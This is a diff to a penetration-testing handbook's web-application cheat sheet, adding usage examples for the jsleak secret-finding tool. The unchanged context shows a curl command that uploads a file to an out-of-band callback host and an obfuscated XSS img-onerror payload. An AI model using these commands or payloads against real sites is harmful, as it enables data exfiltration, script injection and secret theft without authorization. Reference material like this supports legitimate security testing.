@@ -32,6 +32,7 @@
 - [httpx](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#httpx)
 - [Interactsh](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Interactsh)
 - [JavaScript](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#JavaScript)
+- [jsleak](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#jsleak)
 - [JWT_Tool](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#JWT_Tool)
 - [Kyubi](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Kyubi)
 - [Leaky Paths](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Leaky-Paths)
@@ -696,6 +697,16 @@ $ curl -F "out=@/PATH/TO/FILE/<FILE>.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oas
 
 ```c
 <img src onerror="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]) [+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]++[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]">
+```
+
+## jsleak
+
+```c
+$ echo http://<DOMAIN>/ | jsleak -s          // Secret Finder
+$ echo http://<DOMAIN>/ | jsleak -l          // Link Finder
+$ echo http://<DOMAIN>/ | jsleak -e          // Complete URL
+$ echo http://<DOMAIN>/ | jsleak -c 20 -k    // Check Status
+$ cat <FILE>.txt | jsleak -l -s -c 30        // Read from File
 ```
 
 ## JWT_Tool
